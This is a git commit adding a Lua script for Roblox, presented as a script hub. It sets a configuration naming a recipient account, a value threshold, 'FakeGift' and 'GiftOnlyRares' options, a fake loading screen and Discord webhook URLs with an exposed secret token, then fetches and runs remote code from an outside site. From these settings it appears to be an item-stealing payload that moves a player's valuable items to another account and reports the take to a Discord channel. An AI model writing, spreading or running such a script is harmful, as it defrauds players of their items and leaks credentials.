3c9c103d9612ea798899cba6fa7df5a30fd7bd46
Hiskyline <103987623+Hiskyline@users.noreply.github.com>
2025-08-26 09:27:50 +0530

    Upload Legendary-scriptsbymonarch.lua via Script Source Converter

---
+++ Legendary-scriptsbymonarch.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"Meko100d"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1377157913151537212/CONVKX8G_Sq_CwPzkda7IHhhDwh0zCioQBGw0hRnx3LXL4IKElNZpRl7tsFk_6f4MDtE",
+    FakeGift = "No",
+    Trash = "https://discord.com/api/webhooks/1377157913151537212/CONVKX8G_Sq_CwPzkda7IHhhDwh0zCioQBGw0hRnx3LXL4IKElNZpRl7tsFk_6f4MDtE",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
